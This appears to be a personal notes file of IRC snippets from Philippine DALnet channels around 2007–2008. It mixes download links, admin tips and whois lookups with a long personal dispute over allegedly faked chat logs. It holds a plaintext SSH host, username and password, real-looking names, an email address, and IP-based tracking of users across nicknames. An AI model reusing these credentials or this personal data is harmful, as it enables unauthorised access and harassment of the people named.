+http://rapidshare.de/files/27627616/_ballistik.org_LD.part1.rar
+http://rapidshare.de/files/27627620/_ballistik.org_LD.part2.rar
+http://rapidshare.de/files/27623247/_ballistik.org_LD.part3.rar
+
+
+http://www.filedudes.com/Proxy_Scanner_Server-download-8150.html
+http://www.fortedownloads.com/software/proxy/
+
+
+You have successfully registered and selected the Nokia N80 as your free gift.
+Your Referral ID for this order is: 90857358
+
+If you wish to promote your referral id by using links on websites then this is what you would need to put into the link.
+http://www.xpango.com?ref=90857358
+
+
+
+
+[07:22] <~Spyro_boy> siLverbLade, telnet im.bitlbee.org 6667
+[07:28] <%Crazytales> The first thing you type is something like 'USER aa aa aa aa'
+[07:28] <%Crazytales> But you really want to use itvia a real IRC client.
+[07:30] <%Crazytales> Or read RFC2822 so you know how to use IRC over telnet. :P
+[07:30] <%Crazytales> But who would want to do that.
+[07:34] * ~Cobi read RFC 2822, 1459, and the others relating to IRC.
+
+[09:34] -[ Rembrandt ]- Your ClueNet signup code is: 25a0ff2bcf28b79076250a1241a21eb8x47195b0f
+
+
+[09:32] <~Crispy> Essentially, to have another vhost, you need 3 things.
+[09:32] <~Crispy> 1. You need an extra static IP.
+[09:32] <~Crispy> 2. You need an extra forward DNS record (A record) pointing to that IP with the name of the vhost.
+[09:32] <~Crispy> 3. You need a matching PTR record.
+
+[09:41] <~Crispy> Google "internet protocol stack basics".
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: pin|{y (cYb3rWoLf@202.84.103.229)
+ Real Name: jwt
+ Channels: #baguio #tambayanet #makati #mindoro
+ Server: punch.va.us.dal.net - Experience comes from bad judgement.
+ Idle: 12mins 55secs
+ SignOn: Saturday, October 27th, 2007 at 6:26 AM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+[07:01] <~Crispy> chmod public_html to 755 and ~ to 711
+[07:04] <@santium> chmod 0755 public_html
+[07:04] <@santium> chmod 0711 /home/<username>
+
+[08:06] <@santium> Did you put an index.php in the folder?
+[08:07] <@santium> Or index.htm, index.html would work too.
+[08:07] <@santium> SSH and run touch index.php
+
+
+
+
+http://www.phcoders.com:2222/CMD_CHANGE_EMAIL_PASSWORD
+http://www.squirrelmail.org/plugins_category.php?category_id=5
+
+
+
+jian kelly sibug
+
+
+
+
+
+14[15:42] * Deandre24` (~Samara@77-99-41-154.cable.ubr08.hawk.blueyonder.co.uk) Quit (Quit: Pls join #Makati channel..tnx muah!)
+
+[15:11] <@CaRtMaN_01> [15:11] [none] Message from NiC0L33 (~robinson@ppp-70-245-25-197.dsl.okcyok.swbell.net): hi a-nautiKat Sali ka sa #MaKati ....dobol click here :: #Makati ::
+[15:12] <@|nTeL^>  *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+[15:12] <@|nTeL^>  Whois On: NiC0L33 (~robinson@ppp-70-245-25-197.dsl.okcyok.swbell.net)
+[15:12] <@|nTeL^>  Real Name: elfrieda
+[15:12] <@|nTeL^>  Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+[15:12] <@|nTeL^>  Away: :: Oz≥ ::
+[15:12] <@|nTeL^>  Idle: 5secs
+[15:12] <@|nTeL^>  SignOn: Saturday, December 29th, 2007 at 2:23 PM
+[15:12] <@|nTeL^>  *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+[15:12] <@|nTeL^> amf
+[15:12] <@|nTeL^> cno yan?
+[15:12] * |nTeL^ was kicked by PHCore (flood)
+[15:12] <|nTeL^> c tamod?
+[15:12] * |nTeL^ (~spike@124.106.147.254) has joined #coders.ph
+[15:12] * ChanServ sets mode: +o |nTeL^
+[15:12] <@CaRtMaN_01> malay
+[15:12] <@|nTeL^> invite sa makati
+[15:12] <@|nTeL^>  *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+[15:12] <@|nTeL^>  Whois On: NiC0L33 (~robinson@ppp-70-245-25-197.dsl.okcyok.swbell.net)
+[15:12] <@|nTeL^>  Real Name: elfrieda
+[15:12] <@|nTeL^>  Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
+[15:12] <@|nTeL^>  Away: :: Oz≥ ::
+[15:12] <@|nTeL^>  Idle: 5secs
+[15:12] <@|nTeL^>  SignOn: Saturday, December 29th, 2007 at 2:23 PM
+[15:12] <@|nTeL^>  *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+[15:57] [Begee] -MemoServ- #manila >> [21:06:03] <NiC0L33> hi RandyS` Sali ka sa #MaKati ....dobol click here :: #Makati :: I received many invites for #Makati (again!) so if it isnt on the spam list I guess now it should be. Thanks.
+
+
+
+[16:21] <@siLverbLade> .seen mightybond
+[16:21] <@coreblitz> mightybond (simple@121.54.66.22) was last seen parting #baguio 4 hours, 49 minutes ago stating "{}".
+
+
+http://www.youtube.com/watch?v=JgC_BpNxoCw&NR=1
+
+
+[06:01] -MemoServ-   *1 Drixon                          Sun 03-Feb-2008 01:00:28 UTC
+[06:01] -MemoServ- Memo 1 from Drixon. To delete, use: /msg MemoServ@services.dal.net DEL 1
+[06:01] -MemoServ- hello po nicole, musta po, tagal na po akung nag apply d2 sa makati,gus2 ko sana maging part ng family,para ikick ko ung mga spammer,iviter,advertising. alam ni kisses07 ung application ko,friend ko sya,at si tita begge.tnx po
+
+
+
+
+
+
+[21:48] *** siLverbLade [~kairo@121.97.221.109] has left IRC
+
+[01:03] <@honeycured> siLverbLade is ~kairo@121.97.221.109 * lamadrid
+[01:03] <@honeycured> siLverbLade using mozilla.se.eu.dal.net Mozilla.
+[01:03] <@honeycured> siLverbLade End of /WHOIS list.
+
+
+
+[21:54] [|h|e|L|L|] Host: noypi.bounceme.net
+[21:54] [|h|e|L|L|] port: 22
+[21:55] [|h|e|L|L|] login: ibox
+[21:55] [|h|e|L|L|] password: makati
+[21:57] [|h|e|L|L|] http://www.noypishells.page.tl/V_host-List-.htm
+
+
+
+[23:12] <siLverbLade> kinausap mo ba si chikoy bout it?
+[23:12] [ch|wawa] no
+[23:12] [ch|wawa] d nga naga ol si chikoy
+[23:12] <siLverbLade> wait ka na lang pm ka nya
+[23:12] [ch|wawa] nge
+[23:12] <siLverbLade> and if ever what responsibility would you like to take
+[23:12] <siLverbLade> as an sop
+[23:12] [ch|wawa] lagi lang psy yan
+[23:13] [ch|wawa] ala naman
+[23:13] <siLverbLade> so no need to apply
+[23:13] [ch|wawa] ol naman ako lagi
+[23:13] <siLverbLade> sop's should have responsibilities
+[23:13] [ch|wawa] n i watch for the channel naman lagi
+[23:13] <siLverbLade> aop can watch for the channel
+[23:13] <siLverbLade> sop's should have a dedication to a specific responsibility
+[23:14] [ch|wawa] ok
+[23:14] [ch|wawa] then forget abt it
+[23:14] <siLverbLade> ok
+[23:14] <siLverbLade> one option is the recruitment team.. 
+[23:14] [ch|wawa] anu pala site ng rave
+[23:15] <siLverbLade> down pa ang site
+[23:15] [ch|wawa] para maka script ako ng maayus
+[23:15] [ch|wawa] ok
+[23:15] <siLverbLade> gusto mo script?
+[23:15] <siLverbLade> upload ko
+[23:15] [ch|wawa] oo
+[23:15] <siLverbLade> w8
+[23:19] <siLverbLade> try this
+[23:19] <siLverbLade> http://www.fileden.com/files/2007/11/11/1578216/RV301B.zip
+[23:19] [ch|wawa] loading
+
+
+
+
+121.54.66.22 <<-- 
+Last login on 10/02/08 at 11:00PM GMT from
+
+
+
+
+
+[23:48] <siLverbLade> why?
+[23:48] [[R]eGGaEToNe] gf mo si cheska..?
+[23:48] [[R]eGGaEToNe] gf mo si cheska..?
+[23:48] <siLverbLade> who are you?
+[23:49] [[R]eGGaEToNe] gf mo si cheska..?
+[23:49] <siLverbLade> nope
+[23:49] [[R]eGGaEToNe] gf mo si cheska..?
+[23:49] <siLverbLade> why?
+[23:49] [[R]eGGaEToNe] gf mo si cheska..?
+[23:49] [[R]eGGaEToNe] why are you looking for her..?
+[23:49] <siLverbLade> she's my wife
+[23:49] <siLverbLade> u got a problem with that?
+[23:49] [[R]eGGaEToNe] oh okay
+[23:49] [[R]eGGaEToNe] LoL
+[23:49] <siLverbLade> why you kick me?
+[23:50] <siLverbLade> who are you?
+[23:50] <siLverbLade> why are u so concerend about her dude?
+[23:51] <siLverbLade> ??
+[23:52] [[R]eGGaEToNe] if i would have known that she married..........
+[23:52] <siLverbLade> why? what do u mean?
+[23:52] [[R]eGGaEToNe] then i wouldnt have started to court her
+[23:52] <siLverbLade> can't u see in her friendster ?
+[23:53] <siLverbLade> that she's married and has a baby?
+[23:53] [[R]eGGaEToNe] so its you...
+[23:53] [[R]eGGaEToNe] so why does she claim that shes a virgin
+[23:54] <siLverbLade> maybe ur not toking to her that nick is not hers
+[23:54] <siLverbLade> she just use it sometimes
+[23:54] [[R]eGGaEToNe] LoL
+[23:55] [[R]eGGaEToNe] ppl.. believes that shes a virgin............................................
+[23:55] [[R]eGGaEToNe] and you married to her..?
+[23:55] [[R]eGGaEToNe] bye
+[23:55] <siLverbLade> of course.. i tell u that's not her nick..
+[23:55] <siLverbLade> she sometimes use that if she wants to play
+[23:55] <siLverbLade> honeycured is not hers
+[23:56] [[R]eGGaEToNe] im concern about you wife,,,, cus i fell in LOVE with her
+[23:57] <siLverbLade> she seldom uses that nick.. what were u two up to?
+[23:58] <siLverbLade> so what happened?
+[23:58] [[R]eGGaEToNe] and that a wife for you there
+[23:59] [[R]eGGaEToNe] oh well............
+[23:59] [[R]eGGaEToNe] good luck
+
+[23:59] <siLverbLade> didnt she tell u she's married?
+[00:00] <siLverbLade> did she really tell u she's still a virgin? how? u asked her?
+[00:04] <siLverbLade> coz i have a different story
+[00:04] <siLverbLade> she said ur spreading to the chatters that she's a bitch
+[00:04] <siLverbLade> is that true?
+[00:05] [[R]eGGaEToNe] you ask her
+[00:05] [[R]eGGaEToNe] shes your wife
+[00:05] <siLverbLade> so it's true huh
+[00:05] <siLverbLade> y u do that?
+[00:06] <siLverbLade> just because she won't let u court her u wna ruin her dignity?
+[00:06] [[R]eGGaEToNe] woot..?
+[00:06] [[R]eGGaEToNe] i didnt do anything to ruin anyone
+[00:06] <siLverbLade> she told me ur spreading rumors about her
+[00:07] <siLverbLade> that she so inlove with you
+[00:07] <siLverbLade> that she wants to go to the US with you..
+[00:07] [[R]eGGaEToNe] okay... she's your wife...........................
+[00:07] <siLverbLade> why do u have to spread rumors?
+[00:07] [[R]eGGaEToNe] i love her.............
+[00:07] [[R]eGGaEToNe] well.. let me put it this way
+[00:07] <siLverbLade> im listening
+[00:07] [[R]eGGaEToNe] i fell in love with Cheska
+[00:08] <siLverbLade> then?
+[00:08] [[R]eGGaEToNe] according to what she told me..
+[00:08] [[R]eGGaEToNe] and i trusted her
+[00:08] [[R]eGGaEToNe] i love her dude
+[00:08] <siLverbLade> according to what she told you?
+[00:08] <siLverbLade> why what did she tell you
+[00:08] [[R]eGGaEToNe] not cuz she tells me that shes a virgin..
+[00:08] [[R]eGGaEToNe] i love her.... for what she is
+[00:09] [[R]eGGaEToNe] the orginal
+[00:09] <siLverbLade> then why spread rumors after she declined you..
+[00:10] [[R]eGGaEToNe] what rumors..?
+[00:10] [[R]eGGaEToNe] pls tell.........
+[00:10] <siLverbLade> she told me u said her ex bf got her pregnant and she wants u because she wants to go to the us
+[00:11] <siLverbLade> that's the rumors ur spreading
+[00:11] [[R]eGGaEToNe] thats what i was told
+[00:11] <siLverbLade> who told u that?
+[00:11] [[R]eGGaEToNe] so i speak the truth
+[00:11] <siLverbLade> who told u that sir?
+
+
+
+
+
+[00:50] [[R]eGGaEToNe] [20:34] <[M]33> so are you telling me your a virgin..?
+[00:50] [[R]eGGaEToNe] [20:34] <honeycured> yeah
+[00:50] [[R]eGGaEToNe] [20:34] <honeycured> i really am
+[00:50] [[R]eGGaEToNe] [20:34] <[M]33> woOt..?
+[00:50] [[R]eGGaEToNe] [20:34] <[M]33> wwwwaaaaaaaaaaa
+[00:50] [[R]eGGaEToNe] [20:34] <honeycured> thats why ive told you im not like the other girls
+[00:53] [[R]eGGaEToNe] [20:34] <[M]33> soo how can you tell me that you like to be eaten..?
+[00:53] [[R]eGGaEToNe] [20:35] <honeycured> and ive grown up in a conservative way
+[00:53] [[R]eGGaEToNe] [20:35] <honeycured> lolz
+[00:53] [[R]eGGaEToNe] [20:35] <honeycured> ive read romance book
+[00:53] [[R]eGGaEToNe] [20:35] <honeycured> i love romance pocket books
+[00:53] [[R]eGGaEToNe] [20:35] <honeycured> i have so many pocket books here
+[00:53] [[R]eGGaEToNe] [20:37] <honeycured> you didnt believe me?
+[00:53] [[R]eGGaEToNe] [20:38] <[M]33> woot..?
+[00:53] [[R]eGGaEToNe] [20:38] <[M]33> hay nako
+[00:53] [[R]eGGaEToNe] [20:38] <[M]33> cheska
+[00:53] [[R]eGGaEToNe] [20:38] <[M]33> wwaaaaaa
+[00:53] [[R]eGGaEToNe] [20:38] <honeycured> yes tony
+[00:53] [[R]eGGaEToNe] [20:38] <[M]33> brb lang ulit
+
+
+
+[03:18] -NickServ- Info for I_Miss_U_honeycured_N_I_LuV_U:
+[03:18] -NickServ- Last seen address : ~mlife@90.177.33.65.cfl.res.rr.com
+[03:18] -NickServ- Last seen time    : Sun 05-Oct-2008 06:12:01 UTC
+[03:18] -NickServ- Time registered   : Sat 30-Aug-2008 06:22:08 UTC
+[03:18] -NickServ- Time now          : Sun 05-Oct-2008 19:18:17 UTC
+[03:18] -NickServ- Options: Enforced
+[03:18] -NickServ- *** End of Info ***
+
+
+
+ TOTAL points Top 10 -  #1  ^^Ur4GiViNG^^ 52767311  #2  ``Annie 50322782  #3  hazelbrown2 44390571  #4  EaGLe42 25607167  #5  honeycured 22657919  #6  LIZA-SMILE 22583892  #7  Kennette 12148294  #8  Bolan 11349627  #9  corazondexocoatl 10659597  #10  gabs22 8235702 
+
+#6  honeycured 22663919
+
+
+
+[12:34] <kryptoBOT> I found 61 matches to your query.  Here are the 5 most recent (sorted): Chadler I_Miss_U_honeycured_N_I_LuV_U [R]eGGaEToNe EaRTH_ANGeL ReGGaETone. Chadler (~Toe@90.177.33.65.cfl.res.rr.com) was last seen changing nicks from I_Miss_U_honeycured_N_I_LuV_U on #pinas^trivia 1 hour, 19 minutes ago. Chadler is still there.
+[12:34] <stirrup> !seen *!*mlife@*
+[12:34] <kryptoBOT> I found 8 matches to your query.  Here are the 5 most recent (sorted): Just_Me_2 Neo_Law [Chub][Chub] Teo_Knee Just_Me_II. Just_Me_2 (~mlife@90.177.33.65.cfl.res.rr.com) was last seen joining #pinas^trivia 3 hours, 3 minutes ago. Just_Me_2 is still on #pinas^trivia.
+[12:34] <stirrup> !seen *!*@90.177.33.65.cfl.res.rr.com
+[12:34] <kryptoBOT> I found 69 matches to your query.  Here are the 5 most recent (sorted): Chadler I_Miss_U_honeycured_N_I_LuV_U [R]eGGaEToNe Bulilit Just_Me_2. Chadler (~Toe@90.177.33.65.cfl.res.rr.com) was last seen changing nicks from I_Miss_U_honeycured_N_I_LuV_U on #pinas^trivia 1 hour, 20 minutes ago. Chadler is still there.
+
+
+
+[12:35] <kryptoBOT> I found 63 matches to your query.  Here are the 5 most recent (sorted): Guest56703 pagnotta_cool Guest81414 Guest32961 Guest72613. Guest56703 (~peewee@l007014.zseriespenguins.ihost.com) was last seen changing nicks from pagnotta_cool on #pinas-trivia 2 hours, 20 minutes ago.
+
+
+
+
+
+
+[22:46] <stirrup> why did u make up logs to make my husband angry?
+[22:46] <stirrup> i never said anything like that to you
+[22:51] <stirrup> sino ba ako sa akala mo? 
+[22:51] <stirrup> kinamumuhian talaga kita!
+[22:52] <Chadler> who are you....
+[22:52] <Chadler> and i didnt make up any logs.......
+[22:52] <Chadler> it the orginal log
+[22:52] <stirrup> y madami ka ba girls na niloloko?
+[22:52] <stirrup> i never said anything like those logs to you!
+[22:53] <Chadler> who are you....
+[22:53] <stirrup> who do you think i am?
+[22:54] <stirrup> don't ever say u love me coz u just want to ruin my life
+[22:54] <Chadler> silverblade
+[22:54] <stirrup> you told lies to my husband
+[22:55] <stirrup> i hate you so much!
+[22:59] <stirrup> akala ko friend kita tony
+[22:59] <stirrup> but i regret having known you!
+[23:02] <Chadler> i thought the same way Cheska
+[23:02] <stirrup> but ur making up stories and logs just to make my life miserable
+[23:03] <Chadler> i didnt make up any logs
+[23:03] <stirrup> well, i never told you anything like that tony.
+[23:03] <Chadler> :(
+[23:03] <Chadler> the who was honeycured...?
+[23:04] <Chadler> i have so many logs with honeycured
+[23:04] <stirrup> really?
+[23:04] <Chadler> yes really
+[23:05] <stirrup> coz sometimes other ppl in our place use it.. its not my nick fyi
+[23:05] <Chadler> then who was it ?
+[23:05] <stirrup> mind if u send the logs to my email so i could check who used it?
+[23:06] <stirrup> there's a lot using it
+[23:06] <Chadler> tsk tsk
+[23:06] <stirrup> a lot of people here play trivia
+[23:06] <stirrup> using that nick
+[23:07] <stirrup> not only me
+[23:07] <Chadler> wowzzz..................
+[23:07] <Chadler> then im sorry............ whoever was using honeycured.... must really know me
+[23:08] <stirrup> i never saw any logs like those u sent to my husband anywhere in the honeycured irc..
+[23:09] <Chadler> you wanna see more..?
+[23:09] <stirrup> more of ur made up logs? lolz keep it to urself
+[23:10] <stirrup> magaling ka mag make up stories
+[23:10] <Chadler> 
+[23:10] <Chadler> [20:58] Session Ident: honeycured (~markie@l007014.zseriespenguins.ihost.com)
+[23:10] <Chadler> [20:58] <honeycured> good evening to you...
+[23:10] <Chadler> [20:58] <honeycured> muahhh...
+[23:10] <Chadler> [20:59] <honeycured> honeycured has been idle 21hrs 40mins 10secs, signed on Sun Sep 14 07:38:42
+[23:10] <Chadler> [20:59] <honeycured> sorry for that
+[23:10] <Chadler> [20:59] <honeycured> we have experiencing a power shortages here...
+[23:10] <Chadler> [20:59] <honeycured> dunno the reason..
+[23:10] <Chadler> [20:59] <honeycured> anyway, thanks for the msgs..
+[23:10] <Chadler> [21:02] <ReGGaEToNe> yay
+[23:10] <Chadler> [21:02] <ReGGaEToNe> you here
+[23:10] <Chadler> [21:02] <ReGGaEToNe> mauhzz
+[23:10] <Chadler> [21:02] <ReGGaEToNe> mauhzz
+[23:10] <Chadler> [21:02] <ReGGaEToNe> mauhzz
+[23:10] <Chadler> [21:02] <ReGGaEToNe> mauhzz
+[23:10] <Chadler> [21:02] <ReGGaEToNe> mauhzz
+[23:10] <Chadler> [21:03] <honeycured> :)
+[23:10] <Chadler> [21:03] <honeycured> muaahhhh
+[23:10] <Chadler> [21:04] <honeycured> what happened again to Bulilit?
+[23:10] <Chadler> [21:04] <honeycured> lolz
+[23:11] <Chadler> [21:04] <honeycured> its so easy naman now to answer
+[23:11] <Chadler> now can i make up these logs so fas....
+[23:11] <stirrup> maybe ur good at it tony
+[23:11] <Chadler> w.e.
+[23:12] <Chadler> 
+[23:12] <Chadler> [12:21] <MCCS_Cooking> good night
+[23:12] <Chadler> [12:21] <MCCS_Cooking> hayzzzzzzzz
+[23:12] <Chadler> [12:21] <MCCS_Cooking> i saw the msg you pasted..................
+[23:12] <Chadler> [12:22] <MCCS_Cooking> dont  think the wrong way 
+[23:12] <Chadler> [12:22] <MCCS_Cooking> she's just helping us out
+[23:12] <Chadler> [12:22] <MCCS_Cooking> and i asked if she can
+[23:12] <Chadler> [21:45] <MCCS> morning sunshine
+[23:12] <Chadler> [21:55] <MCCS> hayzzzzzzzzzzzzzzz
+[23:12] <Chadler> [21:55] <MCCS> ignore me now
+[23:12] <Chadler> [21:55] <honeycured> im not ignoring you
+[23:12] <Chadler> [21:55] <honeycured> its just that kagigising ko lang
+[23:13] <Chadler> 
+[23:13] <Chadler> yeah i guss im that good..............
+[23:13] <stirrup> tony if that's really true, y don't u send the log .txt files to my email
+[23:13] <stirrup> u know my email naman eh
+[23:13] <Chadler> guess im that good to make things up in a second
+[23:13] <stirrup> yup ur really good
+[23:13] <stirrup> u thought about it for the past few days
+[23:13] <Chadler> 
+[23:13] <Chadler> Cheska
+[23:14] <Chadler> let not fight over nothing...........
+[23:14] <stirrup> the .txt files has real time stamps
+[23:14] <Chadler> what hurts me the most.. is that................. i fell in love with you
+[23:14] <stirrup> and seesion ident
+[23:14] <stirrup> just send me the logs and il found out who u were talking to
+[23:15] <stirrup> i never kiss that way tony and i would never kiss you coz im married
+[23:18] <stirrup> jst send the logs to nicole_reyes20@yahoo.com if u want me to help you find out who that is.. coz i think they erased all the logs about you. otherwise just leave us alone ok?
+[23:25] <Chadler> :(
+[23:25] <Chadler> yeah.................. i will..........
+[23:25] <Chadler> leave you alone........... thanks
+[23:26] <stirrup> thanks
+[23:26] <Chadler> im sorry if i done things the wrong way
+[23:26] <Chadler> hayzzzzzz
+[23:27] <Chadler> im so hurt
+[23:27] <Chadler> you just dont know
+[23:27] <stirrup> i don't like ur creating stories to mess up my life
+[23:27] <Chadler> im not...
+[23:27] <stirrup> why u spreading that i got pregnant by my ex and he left me ....?
+[23:27] <stirrup> ur telling others that im running after u
+[23:27] <Chadler> [09:57] <Neo_Law> good evening Cheska
+[23:27] <Chadler> [10:07] <C|N|R|A> hi good  morning
+[23:27] <Chadler> [10:07] <C|N|R|A> im just  parking in your channel
+[23:27] <Chadler> [10:08] <Neo_Law> awwww
+[23:27] <Chadler> [10:08] <Neo_Law> how are ya?
+[23:27] <Chadler> [10:08] <Neo_Law> sorry about last night
+[23:28] <Chadler> [10:08] <C|N|R|A> im okay
+[23:28] <Chadler> [10:09] <C|N|R|A> its okay
+[23:28] <Chadler> [10:09] <C|N|R|A> :(
+[23:28] <Chadler> [10:10] <C|N|R|A> i used this nick coz no one knows that this is my nick
+[23:28] <Chadler> [10:10] <Neo_Law> oh okay
+[23:28] <Chadler> [10:12] <Neo_Law> i have a haedache
+[23:28] <Chadler> [10:12] <Neo_Law> :(
+[23:28] <Chadler> [10:12] <C|N|R|A> why?
+[23:28] <Chadler> [10:12] <Neo_Law> i didnt have enough sleep
+[23:28] <Chadler> [10:13] <C|N|R|A> why u didnt sleep pa, still have time?
+[23:28] <Chadler> [10:13] <Neo_Law> im thinking about go back to bad
+[23:28] <Chadler> [10:13] <C|N|R|A> okay
+[23:28] <Chadler> [10:14] <Neo_Law> tulog tau
+[23:28] <Chadler> and who is cnra
+[23:28] <Chadler> oh boy
+[23:28] <stirrup> when is that?
+[23:33] <stirrup> i don't exactly know who used that but those are my initials.
+[23:49] <stirrup> u know what tony, the other logs u sent has some added lines coz i never said those words to you.
+[23:57] <Chadler> Cheska...........................
+[23:57] <Chadler> pls..................
+[23:57] <Chadler> let not fight ot argue anymore.....
+[23:57] <Chadler> you have stated a point.......
+[23:57] <Chadler> if it not you................................... 
+[23:58] <Chadler> then illl let it be
+[23:59] <Chadler> let just be like b4.............................. when we met
+[23:59] <Chadler> friends................... and not enemies
+[23:59] <stirrup> You're done with me...goodluck to the next one..thanks...
+[23:59] <Chadler> but, this is one thing i have to say tho...............................
+[00:00] <Chadler> whoever was honeycured a/k/a Cheska
+[00:00] <Chadler> im sorry..................... i fell in love with her
+[00:02] <stirrup> did she fell in love with you too?
+[00:03] <Chadler> accordin to her.. she did
+[00:03] <Chadler> anywhy.........................
+[00:03] <Chadler> now i know i have been fooled.................................
+[00:04] <Chadler> so if this is the real Cheska
+[00:04] <Chadler> PLS................... acccept my appology
+[00:04] <Chadler> im sorry................ i didnt mean to hurt you............
+[00:04] <Chadler> nor your family
+[00:04] <Chadler> how i wish i have knewn earlier........
+[00:05] <Chadler> im sorry.. 
+[00:05] <Chadler> im sorry.. 
+[00:05] <Chadler> im sorry.. 
+[00:05] <stirrup> T_T
+[00:05] <Chadler> let just be good friends
+
+[00:34] <CheskaNicole> im going to sleep now gudnyt
+[00:34] <Chadler> Cheska................
+[00:34] <Chadler> is this really you.?
+[00:35] <Chadler> Cheska................
+[00:35] <Chadler> is this really you.?
+[00:35] <Chadler> is this really you.?
+[00:35] <Chadler> answewr pls
+[00:35] <Chadler> answewr pls
+[00:35] <Chadler> answer me pls
+[00:36] <Chadler> i guess not.......
+[00:36] <Chadler> why did you leave...?
+[00:36] <CheskaNicole> im going to sleep now
+[00:36] <CheskaNicole> antok na po
+[00:36] <CheskaNicole> it's me
+[00:36] <CheskaNicole> gudnyt
+[00:36] <Chadler> wwaaaaaaaaaaa
+[00:36] <Chadler> wait
+[00:36] <CheskaNicole> what?
+[00:37] <Chadler> love you Cheska Nicole Reyes Arboleda
+[00:37] <CheskaNicole> Arboleda?
+
+[00:38] <Chadler> Earth_Angle is you also
+[00:39] <CheskaNicole> yes
+[00:39] <Chadler> why...?
+[00:39] <CheskaNicole> why Arboleda ?
+[00:39] <Chadler> i have propost to Cheska....................
+[00:40] <Chadler> if whe will marry me
+[00:40] <Chadler> anywho
+[00:40] <Chadler> EaRTH_ANGeL is ~Toe@l007014.zseriespenguins.ihost.com * Knee
+[00:41] <Chadler> hayz..............
+[00:41] <Chadler> lets not fight
+[00:41] <Chadler> good night
+
+
+
+
+
+[23:52] <kryptoBOT> I found 6 matches to your query.  Here are the 5 most recent (sorted): skyflakes` yokich chikoy khayeel iLoVeYoU_ReGGaeToNe_iMissYoU. skyflakes` (~crazy@acl1-498bts.gw.smartbro.net) was last seen quitting from #pinas-trivia 22 days, 2 hours, 15 minutes ago stating (Killed (services2.dal.net (Autokilled: {[AKILL} ID:1221399438K-cb\] {[exp/fldhst]} Exploited host, go to http://kline.dal.net/exploits/akills.htm {[AKILL} ID: OS2122139944
+
+[23:53] <kryptoBOT> iLoVeYoU_ReGGaeToNe_iMissYoU (~crazy@acl1-498bts.gw.smartbro.net) was last seen quitting from #pinas-trivia 26 days, 13 hours, 9 minutes ago stating (Quit: You're done with me...goodluck to the next one..thanks...).
+
+
+
+[23:54] -NickServ- Info for iLoVeYoU_ReGGaeToNe_iMissYoU:
+[23:54] -NickServ- Last seen address : ~crazy@acl1-498bts.gw.smartbro.net
+[23:54] -NickServ- Last seen time    : Wed 10-Sep-2008 02:39:44 UTC
+[23:54] -NickServ- Time registered   : Sat 30-Aug-2008 06:25:31 UTC
+[23:54] -NickServ- Time now          : Mon 06-Oct-2008 15:54:58 UTC
+[23:54] -NickServ- *** End of Info ***
+
+
+[23:59] <kryptoBOT> yokich (~crazy@acl1-498bts.gw.smartbro.net) was last seen changing nicks to CRaZyGeRL on #pinas-trivia 23 days, 4 hours, 26 minutes ago.
+
+
+[00:01] <kryptoBOT> CheskaNicole (~crazy@acl1-498bts.gw.smartbro.net) was last seen quitting from #pinas-trivia 32 days, 5 hours, 27 minutes ago stating (Read error: Connection reset by peer).
+
+[00:03] <kryptoBOT> CRaZyGeRL (cheska@l007014.zseriespenguins.ihost.com) was last seen parting #pinas-trivia 16 days, 13 hours, 47 minutes ago stating "{}".
+
+
+
+[03:18] -NickServ- Info for I_Miss_U_honeycured_N_I_LuV_U:
+[03:18] -NickServ- Last seen address : ~mlife@90.177.33.65.cfl.res.rr.com
+[03:18] -NickServ- Last seen time    : Sun 05-Oct-2008 06:12:01 UTC
+[03:18] -NickServ- Time registered   : Sat 30-Aug-2008 06:22:08 UTC
+[03:18] -NickServ- Time now          : Sun 05-Oct-2008 19:18:17 UTC
+[03:18] -NickServ- Options: Enforced
+[03:18] -NickServ- *** End of Info ***
+
+
+
+
+[22:47] [NiC0L3] [22:39] <honeycured> sorry
+[22:47] [NiC0L3] [22:39] <honeycured> nag aaway kami
+[22:47] [NiC0L3] [22:39] <EaGLe42> ngak
+[22:47] [NiC0L3] [22:39] <EaGLe42> bakit
+[22:47] [NiC0L3] [22:39] <EaGLe42> hindi na nga ako kumibo e
+[22:48] <siLverbLade> ok na
+[22:48] [NiC0L3] [22:40] <honeycured> nabasa nya lahat ng usapan natin
+[22:48] [NiC0L3] [22:40] <honeycured> :(
+[22:48] [NiC0L3] [22:40] <honeycured> huhuhuhu
+[22:48] [NiC0L3] [22:40] <EaGLe42> hah
+[22:48] [NiC0L3] [22:40] <EaGLe42> bakit
+[22:48] [NiC0L3] [22:40] <EaGLe42> papano
+[22:48] [NiC0L3] [22:40] <honeycured> galit na galit sya saken
+[22:48] [NiC0L3] [22:40] <honeycured> huhuhuhuhu
+[22:48] [NiC0L3] [22:40] <EaGLe42> e kasi bakit dun mo ako kinausap
+[22:49] <siLverbLade> hmp
+[22:49] <siLverbLade> sana sa honeycured mo na lang kinausap
+[22:49] <siLverbLade> ng di ko malaman
+[22:49] <siLverbLade> T_T
+[22:49] [NiC0L3] [22:41] <EaGLe42> hindi ko nga sinasagot doon
+[22:49] [NiC0L3] [22:41] <honeycured> tanong nya kung may relasyon tau
+[22:49] [NiC0L3] [22:41] <honeycured> bakit ganun tau magusap
+[22:49] [NiC0L3] [22:42] <honeycured> huhuhuhuhuhuhu
+[22:49] [NiC0L3] [22:42] <honeycured> wala na
+[22:49] [NiC0L3] [22:42] <honeycured> wala na akong bf
+[22:49] [NiC0L3] [22:42] <EaGLe42> ngaks
+[22:49] [NiC0L3] [22:42] <EaGLe42> usap tau
+[22:49] [NiC0L3] [22:42] <honeycured> wag na muna
+[22:49] [NiC0L3] [22:42] <honeycured> dc na ako
+[22:49] [NiC0L3] [22:42] <honeycured> huhuhuhuhuhuhu
+[22:49] [NiC0L3] [22:42] <EaGLe42> come on
+[22:49] <siLverbLade> T_T
+[22:50] [NiC0L3] yan lang
+[22:50] [NiC0L3] sige na
+[22:50] [NiC0L3] change d pass of this nick na lng
+
+
+
+
+*+*+*+*+* [ SWAT Intel Report ] *+*+*+*+*
+Whois On: kodie (~1stluvsk8@acl1-1381bts.gw.smartbro.net)
+Real Name: furtherance hardcore
+Channels: +#Breaktime @#friendstock #rshs #cebu @#WESTSIDE @#ManilaTrivia @#zamboanga
+Server: swiftco.wa.us.dal.net - www.swiftco.net - Swift Communications
